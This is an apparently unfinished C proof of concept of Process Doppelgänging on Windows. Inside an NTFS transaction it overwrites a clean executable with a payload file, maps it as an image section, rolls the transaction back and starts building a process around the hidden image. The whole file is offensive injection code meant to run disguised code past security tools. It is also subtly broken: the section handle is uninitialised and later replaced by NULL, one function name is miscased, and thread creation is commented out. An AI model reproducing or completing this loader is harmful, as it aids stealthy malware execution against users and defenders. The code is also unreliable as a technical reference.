#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>

#include "proc_dopp.h"

#pragma comment(lib, "KtmW32.lib")

void fatal_error(char *msg)
{
	printf("[-] Error : %s\n", msg);
	exit(EXIT_FAILURE);
}

/*
 * Open a file and read its content to copy it into memory.
 * Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
 */
LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
{
	HANDLE hPayloadFile;
	HANDLE hHeap;
	LPVOID lpPayloadBuffer;
	DWORD bytesRead = 0;

	// Open the payload file.
	hPayloadFile = CreateFile(
		payload,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hPayloadFile)
		fatal_error("failed to open payload file.");

	if (!GetFileSizeEx(hPayloadFile, payloadSize))
		fatal_error("GetFileSizeEx() returns 0.");

	// Allocate memory for the file.
	if ( !(hHeap = GetProcessHeap()) )
		fatal_error("GetProcessHeap() failed.");

	lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
	if (!lpPayloadBuffer)
		fatal_error("HeapAlloc() failed.");

	// Put file content into memory.
	if ( !ReadFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL) )
		fatal_error("ReadFile() failed.");

	CloseHandle(hPayloadFile);

	return lpPayloadBuffer;
}

int main(void)
{
	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\calc_64.exe";
	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\procexp64.exe";
	HMODULE hNtdll;
	HANDLE hTransaction;
	HANDLE hTransactedFile;
	HANDLE hSection;
	HANDLE hProcess;
	HANDLE hThread;
	LPVOID lpPayloadBuffer;
	LPVOID remoteProcParams;
	DWORD payloadSize;
	DWORD bytesWritten;

	NTSTATUS status;
	NT_CREATE_SECTION _ntCreateSection;
	NT_CREATE_PROCESS_EX _ntCreateProcessEx;
	NT_CREATE_THREAD_EX _ntCreateThreadEx;
	
	RTL_CREATE_PROCESS_PARAMETERS _rtlCreateProcessParameters;
	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	
	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString;
	UNICODE_STRING ustr;
	
	NT_QUERY_INFORMATION_PROCESS _ntQueryInformationProcess;
	PROCESS_BASIC_INFORMATION pbi;


	hNtdll = GetModuleHandle("ntdll.dll");

	// Create a transaction.
	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
	if (INVALID_HANDLE_VALUE == hTransaction)
		fatal_error("CreateTransaction() failed.");

	// Open a transacted file (the target clean process).
	hTransactedFile = CreateFileTransacted(
		targetProcess, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL,  
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL, 
		hTransaction, 
		NULL, 
		NULL
	);
	if (INVALID_HANDLE_VALUE == hTransactedFile)
		fatal_error("CreateFileTransactionA() failed.");

	// Overwrite the file with malicious code.
	lpPayloadBuffer = file_to_buffer(payload, &payloadSize);
	printf("Size of the payload buffer : %d\n", payloadSize);
	printf("Buffer : \n%s\n", lpPayloadBuffer);
	getchar();

	WriteFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);

	// Create the section in the target process.
	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
	printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
	status = 0;
	if (_ntCreateSection)
	{
		status = _ntCreateSection(
			hSection,
			SECTION_ALL_ACCESS,
			NULL,
			0,
			PAGE_READONLY,
			SEC_IMAGE,
			hTransactedFile
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateSection() failed.");
	

	// Rollback the transaction to remove our changes from the file system.
	if (!RollbackTransaction(hTransaction))
		fatal_error("RollbackTransaction() failed.");

	// Create a new process to wrap the previously created section.
	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
	printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
	status = 0;
	if (_ntCreateProcessEx)
	{
		status = _ntCreateProcessEx(
			&hProcess,
			PROCESS_ALL_ACCESS,
			NULL,
			GetCurrentProcess(),
			PS_INHERIT_HANDLES,
			NULL,//hSection,
			NULL,
			NULL,
			FALSE
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateProcessEx() failed.");

	// Create the parameters for that process.
	_rtlCreateProcessParameters = (RTL_CREATE_PROCESS_PARAMETERS)GetProcAddress(hNtdll, "RtlCreateProcessParameters");
	_rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(hNtdll, "RtlInitUnicodeString");
	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParameters);
	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);

	_rtlInitUnicodeString(&ustr, targetProcess);
	status = 0;
	if (_rtlCreateProcessParameters)
	{
		status = _rtlCreateProcessParameters(
			&processParameters,
			&ustr,
			NULL,
			NULL,
			&ustr,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			RTL_USER_PROC_PARAMS_NORMALIZED
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("RtlCreateProcessParameters() failed.");

	printf("Params length : %d\n", processParameters->Length);

	// Allocate enough memory in the remote process' address space to write the 
	// process parameters struct into it.
	remoteProcParams = VirtualAllocEx(
		hProcess,
		(LPVOID)processParameters,
		processParameters->Length,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!remoteProcParams)
		fatal_error("VirtualAllocEx() failed.");

	// Write the parameters to the remote process.
	if ( !WriteProcessMemory(
		hProcess,
		remoteProcParams,
		processParameters,
		processParameters->Length,
		NULL
	))
		fatal_error("WriteProcessMemory() failed.");
	
	// Get remote process' PEB address.
	_ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)GetProcAddress(hNtdll, "NtQueryinformationProcess");
	if (_ntQueryInformationProcess)
	{
		status = _ntQueryInformationProcess(
			hProcess,
			ProcessBasicInformation,
			&pbi, //TODO : Create a PEB struct
			sizeof(PROCESS_BASIC_INFORMATION),
			NULL
		);
	}

	//WriteProcessMemory(RemotePEB.ProcessParameters);

	// Create the main thread for the new process.
	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtdll, "NtCreateThreadEx");
	printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
	/*
	status = 0;
	if (_ntCreateThreadEx)
	{
		status = _ntCreateThreadEx(
			&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			hProcess,
			// TODO : get remote process entry point,
			NULL,
			FALSE,
			0,
			0,
			0,
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateThreadEx() failed.");
	*/

	//NtResumeThread();

	getchar();

	return 0;
}